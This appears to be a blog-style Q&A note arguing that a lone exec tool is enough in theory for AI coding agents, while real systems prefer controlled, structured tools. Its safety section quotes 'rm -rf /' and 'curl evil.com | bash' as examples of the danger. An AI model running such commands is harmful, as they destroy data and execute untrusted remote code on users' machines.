---
audio: false
generated: true
image: false
lang: en
layout: post
title: Minimal Tools For AI Coding Agents
translated: false
type: note
---

**Question:**
What is the minimal set of tool calls needed in systems like Claude Code, Codex, AMP Code, or OpenCode? Is a single `exec` command sufficient since it can theoretically handle everything (read/edit/git/etc.)?

---

**Answer:**

Short answer: **Yes, in principle one `exec` tool is enough — but in practice, it’s not a good design.**

Let’s break this down from a systems + agent design perspective.

---

# 1. Theoretical Minimum: One `exec` Tool

You’re absolutely right about the core idea:

> If an LLM can run arbitrary shell commands, it can do almost anything.

With just:

```
exec(command: string)
```

You can:

### File operations

```bash
cat file.txt
echo "new content" > file.txt
```

### Code editing

```bash
sed -i 's/foo/bar/g' app.js
```

### Git

```bash
git status
git commit -am "fix"
git push
```

### Custom tools

```bash
./my_cli_tool --analyze
```

### Even create new tools dynamically

```bash
echo 'python script' > tool.py
python tool.py
```

So yes:

> **`exec` is functionally complete (Turing-complete interface).**

---

# 2. Why Real Systems Don’t Use Only `exec`

Systems like:

* Claude Code
* Codex
* AMP Code
* OpenCode

**do not rely on raw `exec` alone**, even though they could.

### Reason 1: Safety / Blast Radius

`exec` can do dangerous things:

```bash
rm -rf /
curl evil.com | bash
```

So production systems need:

* sandboxing
* permission control
* scoped capabilities

That’s why they introduce structured tools like:

* `read_file`
* `write_file`
* `run_tests`
* `git_commit`

---

### Reason 2: Observability & Control

With `exec`, everything becomes opaque:

Bad:

```
exec("some complex bash script")
```

Better:

```
read_file("app.js")
edit_file(...)
run_tests()
```

Benefits:

* Easier debugging
* Better logging
* Deterministic behavior
* Fine-grained retries

---

### Reason 3: LLM Reliability

LLMs are **not perfect shell programmers**.

Problems with pure `exec`:

* brittle bash syntax
* quoting issues
* environment differences
* hard-to-parse outputs

Structured tools:

* reduce ambiguity
* constrain behavior
* improve success rate

---

### Reason 4: Token Efficiency

Compare:

#### Using `exec`

```
exec("grep -r 'foo' . | awk ... | sed ...")
```

#### Using tools

```
search_code("foo")
```

Structured tools:

* shorter prompts
* less reasoning overhead
* cheaper tokens

---

### Reason 5: Security Model

Modern agent systems use:

* allowlists
* capability-based access

Example:

```
Agent A → read-only
Agent B → can write files
Agent C → can deploy
```

Impossible to enforce cleanly with raw `exec`.

---

# 3. The Real Minimal Set (Practical)

In practice, most systems converge to something like:

### Core tools

1. `read_file`
2. `write_file` / `edit_file`
3. `list_files`
4. `run_command` (controlled exec)
5. `search`

Optional:

* `git_*` tools
* `test_runner`
* `linter`

---

# 4. Hybrid Design (What You Suggested)

Your idea is actually **very powerful and used in advanced systems**:

> “Define minimal exec + allow custom CLI tools”

This leads to:

### Layered architecture

#### Layer 1: Primitive

```
exec
```

#### Layer 2: User-defined CLI tools

```
mytool analyze
mytool refactor
mytool test
```

#### Layer 3: LLM orchestration

This is exactly how:

* power users of Codex work
* internal devtools evolve
* Unix philosophy applies

---

# 5. Key Insight

The tradeoff is:

| Approach       | Power | Safety | Reliability | Simplicity |
| -------------- | ----- | ------ | ----------- | ---------- |
| Only `exec`    | ★★★★★ | ★      | ★★          | ★★★★★      |
| Structured API | ★★★★  | ★★★★★  | ★★★★★       | ★★★        |
| Hybrid         | ★★★★★ | ★★★★   | ★★★★        | ★★★★       |

---

# 6. Final Take

Your intuition is correct at a deep level:

> **`exec` is the ultimate primitive — everything else is abstraction.**

But:

> **Good agent systems are not about minimal capability, but controlled capability.**

So the best real-world design is:

```
controlled_exec + structured tools + optional CLI extension
```

---

If you want, I can help you design a **minimal but production-grade agent tool system** (like a simplified Codex) with:

* permission model
* tool schema
* CLI extensibility
* sandboxing strategy
